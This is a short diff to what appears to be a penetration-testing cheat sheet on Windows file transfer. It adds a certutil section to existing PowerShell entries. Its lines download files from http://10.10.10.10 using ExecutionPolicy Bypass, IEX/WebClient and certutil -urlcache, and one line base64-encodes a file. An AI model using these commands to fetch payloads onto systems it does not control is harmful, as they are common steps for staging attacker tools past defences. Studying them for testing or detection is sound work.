@@ -58,7 +58,6 @@ USING POWERSHELL -
 
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ------------------------------------------------------------------------------------------------------------------
-
 USING CMD - 
 ------------------------------------------------------------------------------------------------------------------
 
@@ -79,4 +78,17 @@ USING CMD -
     powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
 
 ------------------------------------------------------------------------------------------------------------------
+USING CERTUTIL - 
+------------------------------------------------------------------------------------------------------------------
+
+**Web Content Download**
+    
+    certutil.exe -urlcache -split -f "http://10.10.10.10/demo.txt" demo.txt
+
+**Web Content Download**
+
+    certutil.exe -encode c:1.txt out.b64 & more .\out.b64
+
+------------------------------------------------------------------------------------------------------------------
+
 
